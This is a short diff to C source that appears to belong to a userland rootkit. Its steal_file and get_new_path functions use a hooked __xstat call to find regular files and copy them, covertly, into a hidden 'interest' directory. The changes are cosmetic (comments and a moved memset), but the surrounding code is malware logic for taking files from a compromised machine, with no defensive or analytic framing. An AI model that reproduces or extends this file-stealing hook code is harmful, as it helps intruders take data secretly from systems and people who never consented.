@@ -67,7 +67,8 @@ char *get_new_path(char *filename){
     char *ret = (char *)malloc(path_maxlen),
          *_filename = strdup(filename);
 
-    if(_filename[0] == '.') memmove(_filename, _filename + 1, strlen(_filename));
+    if(_filename[0] == '.') // remove prefixed '.' if there is one.
+        memmove(_filename, _filename + 1, strlen(_filename));
 
     snprintf(ret, path_maxlen, "%s/%s-%d",
                                 INTEREST_DIR,
@@ -79,16 +80,18 @@ char *get_new_path(char *filename){
 }
 
 int steal_file(const char *old_path, char *filename, char *new_path){
-    struct stat astat, pstat;
+    struct stat astat, // for old_path.
+                pstat; // for new_path, should it exist, to check if there's a change in size.
 
     hook(C__XSTAT);
 
     memset(&astat, 0, sizeof(stat));
-    memset(&pstat, 0, sizeof(stat));
 
     if((long)call(C__XSTAT, _STAT_VER, old_path, &astat) < 0) return -1;
     if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */
 
+    memset(&pstat, 0, sizeof(stat));
+    
     /* file already exists(?) */
     if((long)call(C__XSTAT, _STAT_VER, new_path, &pstat)){   /* if the file's different. copy it. */
         if(pstat.st_size != astat.st_size)
